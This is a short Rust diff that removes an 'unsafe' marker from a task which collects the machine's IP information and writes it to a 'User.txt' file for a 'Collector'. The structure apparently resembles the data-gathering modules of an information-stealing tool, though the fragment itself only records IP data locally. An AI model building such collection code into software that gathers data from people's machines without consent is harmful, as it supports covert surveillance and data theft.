@@ -10,7 +10,7 @@ pub(super) struct UserInfoTask;
 impl<C: Collector> Task<C> for UserInfoTask {
     parent_name!("User.txt");
 
-    unsafe fn run(&self, parent: &Path, _: &C) {
+    fn run(&self, parent: &Path, _: &C) {
         let ip_info = unwrapped_ip_info();
 
         let _ = format!("{ip_info}").write_to(parent);
